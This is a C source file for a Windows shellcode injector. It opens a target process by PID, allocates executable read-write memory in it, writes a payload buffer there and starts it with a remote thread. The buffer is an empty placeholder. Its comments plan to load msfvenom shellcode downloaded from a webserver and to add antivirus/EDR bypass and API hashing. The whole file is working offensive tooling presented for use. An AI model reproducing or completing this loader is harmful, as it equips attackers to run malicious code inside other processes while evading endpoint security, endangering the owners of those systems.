#include <windows.h>
#include <stdio.h>

const char* C = "[+]";
const char* I = "[*]";
const char* E = "[!]";

DWORD PID , TID  = NULL;
HANDLE  hProcess, hThread = NULL;
LPVOID rBuffer = NULL;
/* 
* todo 
* 1 implementation of custom shellcode downloaded from a webserver ( 400 is just a placeholder you can insert your own msfvenom payload
* 2 AV / EDR Bypass 
* 3 API Hashing for EDR bypass ? 
*/
unsigned char poop[400];

int main(int argc, char* argv[]) {
	
	if (argc < 2) {
		printf("%s usage: program.exe <PID>", E);
		return EXIT_FAILURE;
	}

	PID = atoi(argv[1]);
	printf("%s trying to open a handle to process (%ld)\n", I, PID);
	
/* OPEN A HANDLE TO THE PROCESS */
	hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);
	printf("%s got a handle to the process! \n\\ ---0x%p\n", C, hProcess);
	if (hProcess == NULL) {
		printf("%s couldn't get a handle to the process (%ld), error: %ld", E, PID, GetLastError());
		return EXIT_FAILURE;
	}
	/* Allocating space with rwx perms */
	rBuffer = VirtualAllocEx(hProcess, NULL, sizeof(poop), (MEM_COMMIT | MEM_RESERVE), PAGE_EXECUTE_READWRITE);
	printf("%s allocated %zu-bytes with PAGE_EXECTUTE_READWRITE permissions", C, sizeof(poop));
	
	/* Writing poop to the Process memory */
	WriteProcessMemory(hProcess, rBuffer, poop, sizeof(poop), NULL);
	printf("%s wrote %zu-bytes to process memory\n", C, sizeof(poop));
	/* Create a remote thread inside of hProcess */
	hThread = CreateRemoteThreadEx(hProcess,NULL,0,(LPTHREAD_START_ROUTINE)rBuffer,NULL,0,0,&TID);
	
	if (hThread == NULL) {
	printf("%s failed to get a handle to the thread error: %ld", E, GetLastError());
	CloseHandle(hProcess);
	return EXIT_FAILURE;
	}

	printf("%s got a handle to the thread (%ld)\n\---0x%p\n", C, TID, hThread);
	
	WaitForSingleObject(hThread, INFINITE );
	printf("%s thread finished executing", C);

	printf("%s cleaning up \n", I);
	CloseHandle(hThread);
	CloseHandle(hProcess);
	printf("%s finished", C);


	return EXIT_SUCCESS;
}
